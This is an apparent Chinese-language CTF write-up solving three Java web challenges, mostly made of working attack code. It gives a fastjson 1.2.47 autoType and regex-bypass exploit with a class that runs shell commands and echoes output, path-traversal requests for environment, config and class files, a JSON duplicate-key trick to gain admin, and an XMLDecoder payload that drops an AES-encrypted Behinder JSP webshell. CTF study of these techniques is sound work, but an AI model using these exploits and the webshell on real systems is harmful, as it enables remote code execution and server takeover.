<p>&#x6709;&#x4E00;&#x4E2A;fastjson&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5165;&#x53E3;</p>
<pre><code class="lang-java"><span class="hljs-meta">@ResponseBody</span> 
<span class="hljs-meta">@RequestMapping</span>({<span class="hljs-string">&quot;/json&quot;</span>}) 
<span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">hello</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> </span>{ 
    String Poc = request.getParameter(<span class="hljs-string">&quot;Poc&quot;</span>); 
    <span class="hljs-keyword">if</span> (Poc != <span class="hljs-keyword">null</span>) { 
            String pattern = <span class="hljs-string">&quot;.*Exec.*|.*cmd.*&quot;</span>;   /
            <span class="hljs-keyword">boolean</span> isMatch = Pattern.matches(pattern, Poc);
        <span class="hljs-keyword">if</span> (isMatch) { 
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No way!!!&quot;</span>; 
        } <span class="hljs-keyword">else</span> { 
            JSON.parse(Poc); 
            <span class="hljs-keyword">return</span> Poc; 
        } 
    } <span class="hljs-keyword">else</span> { 
      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;readme&quot;</span>; 
    } 
}
</code></pre>
<p>fastjson&#x7248;&#x672C;&#x4E3A;1.2.47,&#x9700;&#x8981;&#x6211;&#x4EEC;&#x7ED5;&#x8FC7;autoType,&#x7136;&#x540E;&#x53BB;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x7684;App.Exec#getFlag(), fastjson&#x6709;&#x4E2A;&#x7279;&#x6027;&#xFF0C;&#x9047;&#x5230;\x&#x548C;\u&#x5C31;&#x4F1A;&#x89E3;&#x7801;&#xFF0C;&#x6240;&#x4EE5;&#x6B63;&#x5219;&#x7528;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7F16;&#x7801;&#x7ED5;&#x8FC7;</p>
<pre><code class="lang-java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getFlag</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{ 
    Exec defineclass = <span class="hljs-keyword">new</span> Exec(<span class="hljs-keyword">this</span>.getClass().getClassLoader()); 
    Class clazz = defineclass.defineClass((String)<span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.ClassByte, <span class="hljs-number">0</span>, 
    <span class="hljs-keyword">this</span>.ClassByte.length); 
    Method exec = clazz.getMethod(<span class="hljs-string">&quot;Exec&quot;</span>, String.class); 
    Object Obj = clazz.newInstance(); 
    exec.invoke(Obj, <span class="hljs-keyword">this</span>.cmd); 
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.flag; 
}
</code></pre>
<p>&#x56E0;&#x4E3A;&#x7528;&#x7684;&#x662F;parse&#x6765;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;,&#x53EF;&#x4EE5;<a href="https://paper.seebug.org/1613/#ref" target="_blank">&#x7528;$ref&#x8C03;&#x7528;&#x4EFB;&#x610F;&#x7684;getter</a>, &#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<a href="https://su18.org/post/fastjson-1.2.68/#&#x524D;&#x8A00;" target="_blank">su18&#x5E08;&#x5085;&#x7684;&#x65B9;&#x6CD5;</a></p>
<p>&#x9898;&#x76EE;&#x6CA1;&#x6709;&#x51FA;&#x7F51;, &#x6784;&#x9020;&#x547D;&#x4EE4;&#x56DE;&#x663E;(&#x4E5F;&#x53EF;&#x4EE5;&#x5199;&#x6587;&#x4EF6;, &#x7136;&#x540E;&#x901A;&#x8FC7;&#x6700;&#x5F00;&#x59CB;&#x7684;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x83B7;&#x53D6;flag)</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
<span class="hljs-keyword">import</span> org.apache.catalina.connector.Response;
<span class="hljs-keyword">import</span> org.apache.catalina.connector.ResponseFacade;
<span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;

<span class="hljs-keyword">import</span> javax.servlet.ServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.ServletResponse;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.io.InputStream;
<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.Method;
<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;
<span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SpringEcho</span>  </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Exec</span><span class="hljs-params">(String cmd)</span> </span>{
        <span class="hljs-keyword">try</span> {
            Class c = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span>);
            Method m = c.getMethod(<span class="hljs-string">&quot;getRequestAttributes&quot;</span>);
            Object o = m.invoke(<span class="hljs-keyword">null</span>);
            c = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span>);
            m = c.getMethod(<span class="hljs-string">&quot;getResponse&quot;</span>);
            Method m1 = c.getMethod(<span class="hljs-string">&quot;getRequest&quot;</span>);
            Object resp = m.invoke(o);
            Object req = m1.invoke(o); <span class="hljs-comment">// HttpServletRequest</span>
            Method getWriter = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;javax.servlet.ServletResponse&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getWriter&quot;</span>);
            Method getHeader = Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getHeader&quot;</span>, String.class);
            getHeader.setAccessible(<span class="hljs-keyword">true</span>);
            getWriter.setAccessible(<span class="hljs-keyword">true</span>);
            Object writer = getWriter.invoke(resp);

            String[] commands = <span class="hljs-keyword">new</span> String[<span class="hljs-number">3</span>];
            String charsetName = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;window&quot;</span>) ? <span class="hljs-string">&quot;GBK&quot;</span> : <span class="hljs-string">&quot;UTF-8&quot;</span>;
            <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toUpperCase().contains(<span class="hljs-string">&quot;WIN&quot;</span>)) {
                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;cmd&quot;</span>;
                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;/c&quot;</span>;
            } <span class="hljs-keyword">else</span> {
                commands[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
                commands[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-c&quot;</span>;
            }
            commands[<span class="hljs-number">2</span>] = cmd;
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;println&quot;</span>, String.class).invoke(writer, <span class="hljs-keyword">new</span> Scanner(Runtime.getRuntime().exec(commands).getInputStream(), charsetName).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next());
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;flush&quot;</span>).invoke(writer);
            writer.getClass().getDeclaredMethod(<span class="hljs-string">&quot;close&quot;</span>).invoke(writer);
        }
        <span class="hljs-keyword">catch</span> (Exception e){

        }

    }
}
</code></pre>
<p>POC</p>
<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.util.Locale;
<span class="hljs-keyword">import</span> javassist.ClassPool;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exp</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span>  String <span class="hljs-title">bytesToHexString</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] src)</span></span>{
        StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder(<span class="hljs-string">&quot;&quot;</span>);
        <span class="hljs-keyword">if</span> (src == <span class="hljs-keyword">null</span> || src.length &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
        }
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; src.length; i++) {
            <span class="hljs-keyword">int</span> v = src[i] &amp; <span class="hljs-number">0xFF</span>;
            String hv = Integer.toHexString(v);
            <span class="hljs-keyword">if</span> (hv.length() &lt; <span class="hljs-number">2</span>) {
                stringBuilder.append(<span class="hljs-number">0</span>);
            }
            stringBuilder.append(hv);
        }
        <span class="hljs-keyword">return</span> stringBuilder.toString();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        <span class="hljs-keyword">byte</span>[] bytes = ClassPool.getDefault().get(<span class="hljs-string">&quot;SpringEcho&quot;</span>).toBytecode();
        String code = bytesToHexString(bytes).toUpperCase(Locale.ROOT);
        System.out.println(<span class="hljs-string">&quot;{\n&quot;</span> +
                <span class="hljs-string">&quot;    \&quot;a\&quot;: {\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;App.\\x45\\x78\\x65\\x63\&quot;\n&quot;</span> +
                <span class="hljs-string">&quot;    },\n&quot;</span> +
                <span class="hljs-string">&quot;    \&quot;b\&quot;: {\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;App.\\x45\\x78\\x65\\x63\&quot;,\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;ClassByte\&quot;:x\&apos;&quot;</span>+code+<span class="hljs-string">&quot;\&apos;,\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;\\x63\\x6d\\x64\&quot;: \&quot;ls\&quot;,\n&quot;</span> +
                <span class="hljs-string">&quot;        \&quot;flag\&quot;: {\&quot;$ref\&quot;:\&quot;$.b.flag\&quot;}\n&quot;</span>+
                <span class="hljs-string">&quot;    }\n&quot;</span> +
                <span class="hljs-string">&quot;}&quot;</span>);
    }
}
</code></pre>
<h2 id="gkctf-2021babycat-revenge">[GKCTF 2021]babycat-revenge</h2>
<p>&#x8BBF;&#x95EE;&#x662F;&#x4E00;&#x4E2A;&#x7ED3;&#x5408;&#x767B;&#x5F55;&#x548C;&#x6CE8;&#x518C;&#x7684;&#x7F51;&#x9875;, &#x4F46;&#x662F;&#x6CE8;&#x518C;&#x529F;&#x80FD;&#x56E0;&#x524D;&#x7AEF;&#x9650;&#x5236;&#x4E0D;&#x8BA9;&#x76F4;&#x63A5;&#x4F7F;&#x7528;, &#x6293;&#x5305;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4EE3;&#x7801;&#x903B;&#x8F91;</p>
<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// var obj={};</span>
    <span class="hljs-comment">// obj[&quot;username&quot;]=&apos;test&apos;;</span>
    <span class="hljs-comment">// obj[&quot;password&quot;]=&apos;test&apos;;</span>
    <span class="hljs-comment">// obj[&quot;role&quot;]=&apos;guest&apos;;</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doRegister</span>(<span class="hljs-params">obj</span>)</span>{
        <span class="hljs-keyword">if</span>(obj.username==<span class="hljs-literal">null</span> || obj.password==<span class="hljs-literal">null</span>){
            alert(<span class="hljs-string">&quot;&#x7528;&#x6237;&#x540D;&#x6216;&#x5BC6;&#x7801;&#x4E0D;&#x80FD;&#x4E3A;&#x7A7A;&quot;</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">var</span> d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>();
            d.username=obj.username;
            d.password=obj.password;
            d.role=<span class="hljs-string">&quot;guest&quot;</span>;

            $.ajax({
                url:<span class="hljs-string">&quot;/register&quot;</span>,
                type:<span class="hljs-string">&quot;post&quot;</span>,
                contentType: <span class="hljs-string">&quot;application/x-www-form-urlencoded; charset=utf-8&quot;</span>,
                data: <span class="hljs-string">&quot;data=&quot;</span>+<span class="hljs-built_in">JSON</span>.stringify(d),
                dataType: <span class="hljs-string">&quot;json&quot;</span>,
                success:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)</span>{
                    alert(data)
                }
            });
        }
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;post&#x4F20;&#x53C2;&#x8FDB;&#x884C;&#x6CE8;&#x518C;, &#x6839;&#x636E;ajax&#x6A21;&#x62DF;</p>
<pre><code>data={&quot;username&quot;:&quot;test&quot;,&quot;password&quot;:&quot;test&quot;,&quot;role&quot;:&quot;guest&quot;}
</code></pre><p>&#x666E;&#x901A;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x4F7F;&#x7528;download&#x529F;&#x80FD;, &#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</p>
<pre><code>/home/download?file=../../../../../../../../proc/self/environ
</code></pre><p>&#x5F97;&#x5230;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x548C;tomcat&#x8DEF;&#x5F84;, &#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#x9759;&#x6001;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;<code>/usr/local/tomcat/webapps/ROOT/static/</code></p>
<pre><code>PWD=/home/app
CATALINA_HOME=/usr/local/tomcat
</code></pre><p>&#x53BB;&#x67E5;web.xml</p>
<pre><code>/home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
</code></pre><p>&#x5F97;&#x5230;&#x6574;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x914D;&#x7F6E;</p>
<pre><code>&lt;web-app&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.registerServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.loginServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.homeServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.uploadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.downloadServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.web.servlet.logoutServlet&lt;/servlet-class&gt;
  &lt;/servlet&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;logout&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/logout&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;download&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/home/download&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;register&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/register&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;display-name&gt;java&lt;/display-name&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;login&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/login&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;home&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/home&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;upload&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/home/upload&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;

  &lt;filter&gt;
    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
    &lt;filter-class&gt;com.web.filter.LoginFilter&lt;/filter-class&gt;
  &lt;/filter&gt;
  &lt;filter-mapping&gt;
    &lt;filter-name&gt;loginFilter&lt;/filter-name&gt;
    &lt;url-pattern&gt;/home/*&lt;/url-pattern&gt;
  &lt;/filter-mapping&gt;
  &lt;display-name&gt;java&lt;/display-name&gt;

  &lt;welcome-file-list&gt;
    &lt;welcome-file&gt;/WEB-INF/index.jsp&lt;/welcome-file&gt;
  &lt;/welcome-file-list&gt;
&lt;/web-app&gt;
</code></pre><p>&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5176;&#x4E2D;&#x7684;class&#x4E86;, &#x4E00;&#x5171;6&#x4E2A;&#x529F;&#x80FD;1&#x4E2A;&#x8FC7;&#x6EE4;&#x5668;</p>
<pre><code># &#x5176;&#x5B83;&#x7684;&#x7C7B;&#x4F3C;
/home/download?file=../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/com/web/servlet/registerServlet.class
</code></pre><p>&#x53CD;&#x7F16;&#x8BD1;&#x67E5;&#x9605;&#x4EE3;&#x7801;, &#x8FD8;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x5F97;&#x5230;DAO&#x6587;&#x4EF6;</p>
<pre><code>import com.web.dao.Person;
import com.web.dao.baseDao;
</code></pre><p>&#x67E5;&#x9605;&#x4E0A;&#x4F20;&#x4EE3;&#x7801;&#x53D1;&#x73B0;&#x9650;&#x5236;&#x540E;&#x7F00;&#x4F46;&#x4E0D;&#x9650;&#x5236;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;, &#x4E5F;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x5230;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7684;&#x4F4D;&#x7F6E;, &#x9664;&#x6B64;&#x4E4B;&#x5916;&#x8FD8;&#x6709;&#x5BF9;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x7B80;&#x5355;&#x8FC7;&#x6EE4;</p>
<pre><code>String[] blackList = { &quot;Runtime&quot;, &quot;exec&quot;, &quot;ProcessBuilder&quot;, &quot;jdbc&quot;, &quot;autoCommit&quot; };
</code></pre><p>&#x770B;&#x5230;&#x6CE8;&#x518C;&#x5668;&#x5219;&#x662F;&#x4E00;&#x4E2A;&#x6B63;&#x5219;&#x5339;&#x914D;&#x6CE8;&#x518C;, &#x6211;&#x4EEC;&#x9700;&#x8981;<code>&quot;role&quot;:&quot;admin&quot;</code></p>
<pre><code>    if (!StringUtils.isNullOrEmpty(role)) {
      var = var.replace(role, &quot;\&quot;role\&quot;:\&quot;guest\&quot;&quot;);
      person = (Person)gson.fromJson(var, Person.class);
    } else {
      person = (Person)gson.fromJson(var, Person.class);
      person.setRole(&quot;guest&quot;);
    }
</code></pre><p>&#x505A;&#x7684;&#x662F;json&#x89E3;&#x6790;, &#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;JSON&#x89E3;&#x6790;unicode&#x6216;&#x8005;&#x6CE8;&#x91CA;&#x7ED5;&#x8FC7;&#x53BB;</p>
<pre><code>data={&quot;username&quot;:&quot;1&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;guest&quot;,&quot;\u0072\u006F\u006C\u0065&quot;:&quot;admin&quot;}
</code></pre><p>JSON&#x89E3;&#x6790;&#x540E;&#x4F1A;&#x5BF9;&#x91CD;&#x590D;&#x7684;&#x503C;&#x8FDB;&#x884C;&#x8986;&#x76D6;, &#x4E5F;&#x5C31;&#x662F;<code>&quot;\u0072\u006F\u006C\u0065&quot;:&quot;admin&quot;</code>&#x89E3;&#x6790;&#x4E3A;<code>&quot;role&quot;:&quot;admin&quot;</code>&#x540E;&#x8986;&#x76D6;&#x4E86;&#x524D;&#x9762;&#x7684;<code>&quot;role&quot;:&quot;guest&quot;</code></p>
<p>&#x6216;&#x8005;&#x901A;&#x8FC7;&#x6CE8;&#x91CA;&#x7ED5;&#x8FC7;&#x5339;&#x914D;, &#x56E0;&#x4E3A;<code>&quot;role&quot;:/**/&quot;admin&quot;</code>&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x89E3;&#x6790;&#x540E;&#x7684;&#x8D4B;&#x503C;</p>
<pre><code>data={&quot;username&quot;:&quot;2&quot;,&quot;password&quot;:&quot;2&quot;,&quot;role&quot;:&quot;guest&quot;,&quot;role&quot;:/**/&quot;admin&quot;}
</code></pre><p>&#x5F97;&#x5230;admin&#x6743;&#x9650;&#x540E;&#x901A;&#x8FC7;baseDao&#x53D1;&#x73B0;&#x767B;&#x5F55;&#x5904;&#x8C03;&#x7528;&#x5176;getConnection&#x65B9;&#x6CD5;</p>
<pre><code>connection = baseDao.getConnection();
</code></pre><p>&#x8DDF;&#x8FDB;&#x53D1;&#x73B0;&#x8C03;&#x7528;&#x5176;getConfig&#x65B9;&#x6CD5;</p>
<pre><code>  public static void getConfig() throws FileNotFoundException {
    Object obj = (new XMLDecoder(new FileInputStream(System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;))).readObject();
    if (obj instanceof HashMap) {
      HashMap map = (HashMap)obj;
      if (map != null &amp;&amp; map.get(&quot;url&quot;) != null) {
        driver = (String)map.get(&quot;driver&quot;);
        url = (String)map.get(&quot;url&quot;);
        username = (String)map.get(&quot;username&quot;);
        password = (String)map.get(&quot;password&quot;);
      } 
    } 
  }
</code></pre><p>&#x7136;&#x540E;getConfig&#x4F1A;&#x5BF9;&#x5176;xml&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x53CD;&#x5E8F;&#x5217;&#x5316;, &#x8003;&#x5BDF;&#x7684;&#x662F;<a href="https://www.cnblogs.com/hetianlab/p/13534535.html" target="_blank">XMLDecoder&#x53CD;&#x5E8F;&#x5217;&#x5316;</a>, &#x4F7F;&#x7528; <a href="https://b1ue.cn/archives/239.html" target="_blank">weblogic XMLDecoder payload</a> &#x53BB;&#x7ED5;&#x8FC7;(&#x51B0;&#x874E;&#x9A6C;, &#x8FDE;&#x63A5;&#x5BC6;&#x7801;rebeyond)</p>
<pre><code>&lt;java version=&quot;1.8.0_192&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
&lt;object class=&quot;java.io.PrintWriter&quot;&gt;
&lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/ricky.jsp&lt;/string&gt;
&lt;void method=&quot;println&quot;&gt;
&lt;string&gt;&lt;![CDATA[&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;]]&gt;&lt;/string&gt;
&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;
&lt;/object&gt;
&lt;/java&gt;
</code></pre><p>XMLDecoder&#x76F8;&#x5F53;&#x4E8E;&#x6267;&#x884C;</p>
<pre><code>java.io.PrintWriter x = new java.io.PrintWriter(&quot;/usr/local/tomcat/webapps/ROOT/static/ricky.jsp&quot;);
x.println(&quot;...&quot;);
x.close();
</code></pre><p>&#x4E0A;&#x4F20;&#x8DEF;&#x5F84;</p>
<pre><code>../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/db/db.xml
</code></pre><p>&#x7136;&#x540E;&#x518D;&#x6B21;&#x767B;&#x5F55;&#x5373;&#x53EF;&#x89E6;&#x53D1;, &#x6267;&#x884C;/readflag&#x5373;&#x53EF;</p>
<h2 id="&#x767B;&#x9646;&#x4E0D;&#x4E86;revenge">&#x767B;&#x9646;&#x4E0D;&#x4E86;_Revenge</h2>
<p>&#x9A8C;&#x8BC1;&#x7801;&#x5904;&#x6709;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;</p>
<pre><code>/v/c?r=YzgxZTcyOC5qcGc=
</code></pre><p>&#x770B;&#x8FDB;&#x7A0B;, &#x5F97;&#x77E5;tomcat&#x4F4D;&#x7F6E;</p>
<pre><code>/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vcHJvYy9zZWxmL2NtZGxpbmU=
file=/home/apache-tomcat-8.5.45/conf/logging.properties
</code></pre><p>&#x7136;&#x540E;&#x5C31;&#x662F;&#x53BB;&#x67E5;&#x9605;ROOT&#x6839;&#x76EE;&#x5F55;, web.xml&#x548C;pom.xml</p>
<pre><code>/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s
/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9wb20ueG1s
</code></pre><p>&#x7136;&#x540E;&#x6839;&#x636E;pom.xml&#x53BB;&#x83B7;&#x53D6;&#x6846;&#x67B6;</p>
<pre><code>      &lt;dependency&gt;
         &lt;groupId&gt;ctfshow&lt;/groupId&gt;
         &lt;artifactId&gt;tiny-framework&lt;/artifactId&gt;
         &lt;scope&gt;system&lt;/scope&gt;
         &lt;version&gt;1.1&lt;/version&gt;
         &lt;systemPath&gt;${basedir}\lib\tiny-framework-1.0.1.jar&lt;/systemPath&gt;
      &lt;/dependency&gt;
   &lt;/dependencies&gt;
</code></pre><p>&#x53BB;&#x4E0B;&#x8F7D; tiny-framework-1.0.1.jar</p>
<pre><code>/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9saWIvdGlueS1mcmFtZXdvcmstMS4wLjEuamFy
</code></pre><p>&#x7528;winrar&#x81EA;&#x5E26;&#x7684;&#x4FEE;&#x590D;&#x529F;&#x80FD;&#x4FEE;&#x590D;&#x540E;&#x5373;&#x53EF;&#x53CD;&#x7F16;&#x8BD1;&#x67E5;&#x9605;&#x6E90;&#x7801;, &#x5206;&#x6790;&#x540E;&#x7EE7;&#x7EED;&#x83B7;&#x53D6;class&#x6587;&#x4EF6;</p>
<pre><code>/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jb25maWcvY29udHJvbGxlci5wcm9wZXJ0aWVz

s=com.ctfshow.controller.Index
errorController=com.ctfshow.controller.ErrorPage
index=com.ctfshow.controller.Index
v=com.ctfshow.controller.Validate

/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvSW5kZXguY2xhc3M=

/v/c?r=Li4vLi4vLi4vLi4vLi4vLi4vLi4vaG9tZS9hcGFjaGUtdG9tY2F0LTguNS40NS93ZWJhcHBzL1JPT1QvV0VCLUlORi9jbGFzc2VzL2NvbS9jdGZzaG93L2NvbnRyb2xsZXIvVmFsaWRhdGUuY2xhc3M=
</code></pre><p>&#x53D1;&#x73B0;&#x6CE8;&#x518C;&#x5904;&#x53EF;&#x4EE5;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;, &#x5199;&#x9A6C;&#x53EF;&#x4EE5;&#x5199;&#x5728;WEB-INF&#x4E0B;, &#x7136;&#x540E;&#x8986;&#x5199;web.xml&#x89E6;&#x53D1;tomcat&#x70ED;&#x90E8;&#x7F72;getshell</p>
